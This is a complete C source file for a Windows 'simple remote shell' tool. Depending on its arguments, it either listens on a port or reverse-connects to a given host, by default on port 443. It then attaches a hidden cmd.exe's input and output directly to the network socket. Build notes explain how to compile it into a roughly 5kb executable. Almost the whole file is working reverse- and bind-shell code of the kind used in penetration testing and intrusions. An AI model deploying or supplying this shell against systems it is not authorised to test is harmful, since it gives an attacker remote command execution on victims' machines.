
/**
  Copyright (C) 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
/**

To compile this, you can use msvc or gcc

  gcc s1.c -lws2_32 -lshlwapi -orcmd
  cl s1.c ws2_32.lib shlwapi.lib
  
To create a smaller exe file around 5kb, compile with clib.c but this requires longer command

  cl s1.c /nologo /c /O2 /Os /GS- /Oi-
  cl clib.c /nologo /c /O2 /Os /GS- /Oi-
  link /nologo /NODEFAULTLIB /MERGE:.rdata=.text s1.obj clib.obj Shlwapi.lib user32.lib kernel32.lib ws2_32.lib advapi32.lib
  
*/

#define _WIN32_WINNT 0x0501

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <Shlwapi.h>

#define CLIENT_MODE 0
#define SERVER_MODE 1

#define DEFAULT_PORT "443" // as client or server

// structure for parameters
typedef struct _args_t {
  SOCKET s, r;
  char *port, *address;
  int port_nbr, ai_family, mode, ai_addrlen;
  struct sockaddr *ai_addr;
  char ip[64];
  struct sockaddr_in v4;
  struct sockaddr_in6 v6;
} args_t;

/**F*****************************************************************/
void xstrerror (char *fmt, ...) 
/**
 * PURPOSE : Display windows error
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
  char    *error=NULL;
  va_list arglist;
  char    buffer[2048];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL))
  {
    printf ("[ %s : %s\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("[ %s : %i\n", buffer, dwError);
  }
}

/**F*****************************************************************/
char *addr2ip (args_t *p)
/**
 * PURPOSE : Convert network address to ip string
 *
 * RETURN :  String ASCII representation of network address
 *
 * NOTES :   None
 *
 *F*/
{
  DWORD ip_size=64;
  WSAAddressToString (p->ai_addr, p->ai_addrlen, 
    NULL, (char*)p->ip, &ip_size);
    
  return (char*)p->ip;
}

/**F*****************************************************************/
BOOL open_tcp (args_t *p)
/**
 * PURPOSE : initialize winsock, resolve network address
 *
 * RETURN :  TRUE for okay else FALSE
 *
 * NOTES :   None
 *
 *F*/
{
  struct addrinfo *list, *e;
  struct addrinfo hints;
  BOOL            bStatus=FALSE;
  WSADATA         wsa;
  int             on=1;
  
  // initialize winsock
  WSAStartup (MAKEWORD (2, 0), &wsa);
  
  // set network address length to zero
  p->ai_addrlen = 0;
  
  // if no address supplied
  if (p->address==NULL)
  {
    // is it ipv4?
    if (p->ai_family==AF_INET) {
      p->v4.sin_family      = AF_INET; 
      p->v4.sin_port        = htons((u_short)p->port_nbr);
      p->v4.sin_addr.s_addr = INADDR_ANY;
      
      p->ai_addr    = (SOCKADDR*)&p->v4;
      p->ai_addrlen = sizeof (struct sockaddr_in);
    } else {
      // else it's ipv6
      p->v6.sin6_family     = AF_INET6;
      p->v6.sin6_port       = htons((u_short)p->port_nbr);
      p->v6.sin6_addr       = in6addr_any;
      
      p->ai_addr    = (SOCKADDR*)&p->v6;
      p->ai_addrlen = sizeof (struct sockaddr_in6);
    }
  } else {
    ZeroMemory (&hints, sizeof (hints));

    hints.ai_flags    = AI_PASSIVE;
    hints.ai_family   = p->ai_family;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;    
    
    // get all network addresses
    if ((getaddrinfo (p->address, p->port, &hints, &list)) == 0) 
    {
      for (e=list; e!=NULL; e=e->ai_next) 
      {
        // copy to ipv4 structure
        if (p->ai_family==AF_INET) {
          memcpy (&p->v4, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (SOCKADDR*)&p->v4;        
        } else {
          // ipv6 structure
          memcpy (&p->v6, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (SOCKADDR*)&p->v6;
        }
        // assign size of structure
        p->ai_addrlen = e->ai_addrlen;
        break;
      }
      freeaddrinfo (list);
    } else {
      xstrerror ("getaddrinfo");
    }
  }
  // create socket if we have address resolved
  if (p->ai_addrlen!=0) 
  {
    p->s=WSASocket(p->ai_family, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (p->s!=SOCKET_ERROR) 
    {
      // this is only really necessary for listen operations
      setsockopt (p->s, SOL_SOCKET, SO_REUSEADDR, (char*)&on, sizeof (on));
      bStatus=TRUE;
    }
  }
  return bStatus;
}

/**F*****************************************************************/
void close_tcp (args_t *p)
/**
 * PURPOSE : shutdown and close sockets, events and cleanup
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
  // disable send/receive operations
  shutdown (p->s, SD_BOTH);
  // close socket
  closesocket (p->s);
  // clean up
  WSACleanup();
}

/**F*****************************************************************/
void usage (void) 
{
  printf ("\n  usage: s1 <address> [options]\n");
  printf ("\n  -4           Use IP version 4 (default)");
  printf ("\n  -6           Use IP version 6");
  printf ("\n  -l           Listen for incoming connections");
  printf ("\n  -p <number>  Port number to use (default is 443)");
  printf ("\n\n  Press any key to continue . . .");
  getchar ();
  exit (0);
}

/**F*****************************************************************/
char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void parse_args (args_t *p, int argc, char *argv[])
{
  int  i;
  char opt;
  
  // for each argument
  for (i=1; i<argc; i++)
  {
    // is this option?
    if (argv[i][0]=='-' || argv[i][1]=='/')
    {
      // get option value
      opt=argv[i][1];
      switch (opt)
      {
        case '4':
          p->ai_family=AF_INET;
          break;
        case '6':     // use ipv6 (default is ipv4)
          p->ai_family=AF_INET6;
          break;
        case 'l':     // listen for incoming connections
          p->mode=SERVER_MODE;
          break;
        case 'p':     // port number
          p->port=getparam(argc, argv, &i);
          p->port_nbr=atoi(p->port);
          break;
        case '?':     // display usage
        case 'h':
          usage ();
          break;
        default:
          printf ("  [ unknown option %c\n", opt);
          break;
      }
    } else {
      // assume it's hostname or ip
      p->address=argv[i];
    }
  }
}

void cmd (SOCKET s)
{
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;

  ZeroMemory (&si, sizeof(si));
  ZeroMemory (&pi, sizeof(pi));

  si.cb         = sizeof(si);
  // redirect all input/output through socket
  si.dwFlags    = STARTF_USESTDHANDLES;
  si.hStdInput  = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError  = (HANDLE)s;
  
  printf ("[ executing cmd.exe\n");
  // execute cmd.exe
  if (CreateProcess (NULL, "cmd", NULL, NULL, 
    TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
  {
    printf ("[ running\n");
    // wait until it terminates
    WaitForSingleObject (pi.hProcess, INFINITE);
    
    CloseHandle (pi.hThread);
    CloseHandle (pi.hProcess);
  } else {
    xstrerror ("CreateProcess");
  }
}

// reverse connect to remote host
void client(args_t *p)
{
  printf ("[ connecting to %s\n", addr2ip(p));
  
  if (connect (p->s, p->ai_addr, p->ai_addrlen)==0)
  {
    printf ("[ connected\n");
    cmd(p->s);
    printf ("[ closing connection\n");
  } else {
    xstrerror ("connect");
  }
}

void server(args_t *p)
{
  // bind to local address
  if (bind (p->s, p->ai_addr, p->ai_addrlen) != SOCKET_ERROR) 
  {
    // listen for incoming connections
    if (listen (p->s, SOMAXCONN) != SOCKET_ERROR) 
    {
      printf ("[ waiting for connections on %s\n", addr2ip(p));
      p->r=accept (p->s, p->ai_addr, &p->ai_addrlen);
      
      if (p->r!=SOCKET_ERROR) {
        printf ("[ connection from %s\n", addr2ip(p));
        cmd(p->r);
        printf ("[ closing connection\n");
        shutdown (p->r, SD_BOTH);
        closesocket (p->r);
      } else {
        xstrerror ("accept()");
      }       
    } else {
      xstrerror ("listen()");
    }
  } else {
    xstrerror ("bind()");
  }
}

int main (int argc, char *argv[])
{
  args_t args;
  
  memset (&args, 0, sizeof(args));
  
  // set default parameters
  args.address   = NULL;
  args.ai_family = AF_INET;
  args.port      = DEFAULT_PORT;
  args.port_nbr  = atoi(args.port);
  args.mode      = -1;
  
  printf ("\n[ simple remote shell for windows v1\n");
  
  parse_args(&args, argc, argv);
  
  if (args.mode == -1) {
    if (args.address==NULL) {
      args.mode=SERVER_MODE;
    } else {
      args.mode=CLIENT_MODE;
    }
  }
  
  if (open_tcp(&args))
  {
    if (args.mode == SERVER_MODE)
    {
      server(&args);
    } else {
      client(&args);
    }
    close_tcp(&args);
  }
  return 0;
}

